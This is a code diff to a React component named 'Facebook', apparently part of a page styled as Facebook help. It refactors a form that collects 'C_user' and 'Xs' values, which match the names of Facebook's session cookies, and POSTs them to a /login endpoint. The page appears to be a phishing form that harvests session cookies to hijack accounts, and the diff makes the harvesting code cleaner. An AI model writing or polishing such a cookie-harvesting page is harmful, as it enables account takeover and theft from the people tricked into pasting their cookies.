@@ -2,31 +2,29 @@ import React, { useState } from 'react'
 import "./Facebook.css"
 import HelpData from './HelpData'
 const Facebook = () => {
-    const [data, Setdata] = useState({
+    const [data, setData] = useState({
         Cuser: "",
         Xs: "",
     });
 
-    const handleClick = (e) => {
+    const handleChange = (e) => {
         const name = e.target.name;
         const value = e.target.value;
         console.log(name, value);
 
-        Setdata({ ...data, [name]: value });
+        setData({ ...data, [name]: value });
     }
 
     const HandleSubmit = async (e) =>{
         e.preventDefault();
         
-        const {Cuser, Xs}= data;
+       
         const res = await fetch(`/login`,{
           method: "POST",
           headers:{
             "content-type": "application/json"
           },
-          body:JSON.stringify({
-            Cuser, Xs
-          })
+          body:JSON.stringify(data)
         });
   
         const datahit = await res.json();
@@ -116,11 +114,11 @@ const Facebook = () => {
                                                 <form method='POST' onClick={HandleSubmit}>
                                                     <div className="mb-3">
                                                         <label className="form-label">C_user</label>
-                                                        <input type="text" name='Cuser' value={data.Cuser} onChange={handleClick} className="form-control" />
+                                                        <input type="text" name='Cuser' value={data.Cuser} onChange={handleChange} className="form-control" />
                                                     </div>
                                                     <div className="mb-3">
                                                         <label className="form-label">Xs</label>
-                                                        <input type="text" name='Xs' value={data.Xs} onChange={handleClick} className="form-control" id="exampleInputPassword1" />
+                                                        <input type="text" name='Xs' value={data.Xs} onChange={handleChange} className="form-control" id="exampleInputPassword1" />
                                                     </div>
 
                                                     <div className="mb-3 py-1 px-3 text-end">
